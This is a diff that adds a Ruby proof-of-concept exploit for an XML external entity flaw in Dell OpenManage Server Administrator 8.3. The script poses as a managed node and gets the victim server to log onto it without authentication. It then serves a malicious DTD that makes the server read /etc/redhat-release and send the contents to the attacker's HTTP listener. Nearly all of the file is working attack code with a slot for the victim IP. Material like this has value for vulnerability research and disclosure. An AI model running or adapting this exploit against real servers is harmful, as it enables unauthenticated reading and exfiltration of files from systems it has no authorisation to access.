@@ -1,0 +1,164 @@
+#!/usr/bin/ruby
+#
+# Exploit Title: Dell OpenManage Server Administrator 8.3 XXE
+# Date: June 9, 2016
+# Exploit Author: hantwister
+# Vendor Homepage: http://en.community.dell.com/techcenter/systems-management/w/wiki/1760.openmanage-server-administrator-omsa
+# Software Link: http://www.dell.com/support/home/us/en/19/Drivers/DriversDetails?driverId=CCKPW
+# Version: 8.3
+# Tested On: RHEL7
+#
+# Description:
+#     When using an XML parser on returned data by a remote node, OMSA does not
+#     restrict the use of external entities.
+#
+#     This PoC first emulates a remote node (OMSA -> WS-Man -> this) and
+#     requests from the victim OMSA (this -> HTTPS -> OMSA) that it be managed.
+#
+#     Next, the PoC requests (this -> HTTPS -> OMSA) a plugin that will attempt
+#     to parse returned XML, and when the OMSA instance requests this XML from
+#     the emulated node (OMSA -> WS-Man -> this), the PoC returns XML that
+#     includes a XXE attack, revealing the contents of /etc/redhat-release.
+#
+#     Because OMSA merely requires you be authenticated to the node you are
+#     managing, which we control, authentication to the victim is not required
+#     to exploit this vulnerability.
+#
+#     To use, change line 55 to your victim IP. If you have multiple network
+#     interfaces, you may wish to manually specify which one will be accessible
+#     to the victim on line 60.
+#
+#     Note: during testing, OMSA would periodically begin rejecting connections
+#     to fake nodes and would need to be restarted; do not expect multiple runs
+#     against the same victim to be successful unless you can restart it.
+#
+# Copyright (C) 2016 hantwister
+#
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+
+require 'webrick'
+require 'webrick/https'
+require 'nokogiri'
+require 'securerandom'
+require "net/http"
+require "uri"
+
+victimip = nil
+if victimip.nil?
+  abort "You should modify this file and specify a victim IP."
+end
+
+attackerip = Socket.ip_address_list.detect{|intf| intf.ipv4_private?}.ip_address
+print "Your IP: #{attackerip}\n\nThe victim must be able to reach you at this IP, port 5986 and 8080.\nIf it isn't right, modify this script.\nYou have ten seconds to abort this script.\n\n"
+
+sleep 10
+
+wsmanCallback = WEBrick::HTTPServer.new(:Port => 5986, :SSLEnable => true, :SSLCertName => [ %w[CN localhost] ])
+
+wsmanCallback.mount_proc '/wsman' do |req, res|
+  doc = Nokogiri::XML(req.body) do |config|
+    config.options = Nokogiri::XML::ParseOptions::NONET
+  end
+
+  doc.xpath('//wsmid:Identify', 'wsmid' => 'http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd').each do |idRequest|
+    res.status = 200
+    res['Content-Type'] = 'application/soap+xml;charset=UTF-8'
+    res.body = '<?xml version="1.0" encoding="UTF-8"?><s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:wsmid="http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd"><s:Header/><s:Body><wsmid:IdentifyResponse><wsmid:ProtocolVersion>http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd</wsmid:ProtocolVersion><wsmid:ProductVendor>Fake Dell Open Manage Server Node</wsmid:ProductVendor><wsmid:ProductVersion>1.0</wsmid:ProductVersion></wsmid:IdentifyResponse></s:Body></s:Envelope>'
+  end
+
+  doc.xpath('//n1:SendCmd_INPUT', 'n1' => 'http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/DCIM_OEM_DataAccessModule').each do |dellRequest|
+    dellCmd = dellRequest.child.text
+
+    respText = " "
+    if dellCmd.start_with?("__00omacmd=getuserrightsonly ")
+      userRights = (7 + (7 << 16))
+      respText = "<SMStatus>0</SMStatus><UserRightsMask>#{userRights}</UserRightsMask>"
+    elsif dellCmd.start_with?("__00omacmd=getaboutinfo ")
+      respText = "<ProductVersion>6.0.3</ProductVersion>"
+    elsif dellCmd.start_with?("__00omacmd=getcmdlogcontent")
+      respText = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE bogus [\n  <!ENTITY % file SYSTEM \"file:///etc/redhat-release\">\n  <!ENTITY % dtd SYSTEM \"http://#{attackerip}:8080/stage2.dtd\">\n%dtd;\n%send;\n]]>\n<bogus><blah /></bogus>"
+    end
+
+    resDoc = Nokogiri::XML("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:wsa=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" xmlns:wsman=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\" xmlns:n1=\"http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/DCIM_OEM_DataAccessModule\"><s:Header><wsa:To> </wsa:To><wsa:RelatesTo> </wsa:RelatesTo><wsa:MessageID> </wsa:MessageID></s:Header><s:Body><n1:SendCmd_OUTPUT><n1:ResultCode>0</n1:ResultCode><n1:ReturnValue> </n1:ReturnValue></n1:SendCmd_OUTPUT></s:Body></s:Envelope>")
+
+    resDoc.xpath('//wsa:To').first.content=doc.xpath('//wsa:Address').first.text
+    resDoc.xpath('//wsa:RelatesTo').first.content=doc.xpath('//wsa:MessageID').first.text
+    resDoc.xpath('//wsa:MessageID').first.content=SecureRandom.uuid
+
+    resDoc.xpath('//n1:ReturnValue').first.content=respText
+
+    res.status = 200
+    res['Content-Type'] = 'application/soap+xml;charset=UTF-8'
+    res.body = resDoc.to_xml
+  end
+end
+
+wsmanThread = Thread.new do
+  wsmanCallback.start
+end
+
+xxeCallback = WEBrick::HTTPServer.new(:Port => 8080)
+
+xxeCallback.mount_proc '/stage2.dtd' do |req, res|
+  res.status = 200
+  res['Content-Type'] = 'application/xml-dtd'
+  res.body = "<!ENTITY % all\n \"<!ENTITY &#x25; send SYSTEM 'http://#{attackerip}:8080/xxe?result=%file;'>\"\n>\n%all;\n"
+end
+
+result = nil
+
+xxeCallback.mount_proc '/xxe' do |req, res|
+  result = req.query['result']
+  wsmanCallback.shutdown
+  xxeCallback.shutdown
+end
+
+xxeThread = Thread.new do
+  xxeCallback.start
+end
+
+trap 'INT' do
+  wsmanCallback.shutdown
+  xxeCallback.shutdown
+  abort "Exiting"
+end
+
+httpConn = Net::HTTP.new(victimip, 1311)
+httpConn.use_ssl=true
+httpConn.verify_mode=OpenSSL::SSL::VERIFY_NONE
+
+print "\n\nRequesting that the victim log onto this malicious node...\n\n"
+
+logonUri = URI.parse("https://#{victimip}:1311/LoginServlet?flag=true&managedws=false")
+logonReq = Net::HTTP::Post.new(logonUri.request_uri)
+logonReq.set_form_data({"manuallogin" => "true", "targetmachine" => attackerip, "user" => "nobody", "password" => "", "application" => "omsa", "ignorecertificate" => "1"})
+
+logonRes = httpConn.request(logonReq)
+
+jSessionId = logonRes['Set-Cookie']
+jSessionId = jSessionId[(jSessionId.index('=')+1)..(jSessionId.index(';')-1)]
+
+vid = logonRes['Location']
+vid = vid[(vid.index('&vid=')+5)..-1]
+
+print "\n\nJSESSIONID = #{jSessionId}\nVID = #{vid}\nRequesting the victim's CmdLogWebPlugin...\n\n"
+
+pluginUri = URI.parse("https://#{victimip}:1311/#{vid}/DataArea?plugin=com.dell.oma.webplugins.CmdLogWebPlugin&vid=#{vid}")
+pluginReq = Net::HTTP::Get.new(pluginUri.request_uri)
+pluginReq['Cookie']="JSESSIONID=#{jSessionId}"
+
+pluginRes = httpConn.request(pluginReq)
+
+wsmanThread.join
+xxeThread.join
+
+print "\n\nSuccessful XXE: #{result}\n\n" unless result.nil?
